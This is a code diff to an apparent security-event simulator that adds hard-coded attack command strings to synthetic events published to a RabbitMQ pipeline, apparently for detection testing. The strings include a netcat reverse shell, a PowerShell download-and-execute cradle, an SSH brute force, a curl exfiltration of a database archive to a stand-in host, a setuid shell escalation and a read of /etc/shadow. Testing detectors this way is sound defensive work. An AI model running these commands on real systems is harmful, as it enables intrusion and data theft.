@@ -179,6 +179,23 @@ class EventEngine:
                     indicators = []
 
             # 1. Publish to RabbitMQ pipeline
+            cmd = None
+            if force_attack:
+                attack_cmds = {
+                    "privilege_escalation": "sudo chmod u+s /bin/bash",
+                    "abnormal_process": "nc -e /bin/bash 198.51.100.77 4444",
+                    "powershell": "powershell -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')",
+                    "failed_login": "hydra -l root -P passwords.txt ssh://192.168.1.4:2222",
+                    "data_exfiltration": "curl -X POST -F file=@sensitive_db.tar.gz http://198.51.100.77/exfil",
+                    "lateral_movement": "ssh -i id_rsa root@10.0.0.5 'cat /etc/shadow'",
+                }
+                cmd = attack_cmds.get(ev.event_type)
+
+            raw_dict = {"generated_by": "controlled_event_engine", "force_attack": force_attack}
+            if cmd:
+                raw_dict["command"] = cmd
+                raw_dict["command_line"] = cmd
+
             payload = {
                 "message_id": msg_id,
                 "event_type": ev.event_type,
@@ -189,7 +206,7 @@ class EventEngine:
                 "location": ev.location,
                 "status": ev.status,
                 "risk_indicators": indicators,
-                "raw_payload": {"generated_by": "controlled_event_engine", "force_attack": force_attack},
+                "raw_payload": raw_dict,
             }
 
             pub_ok, pub_result = rabbitmq_pipeline.publish(payload)
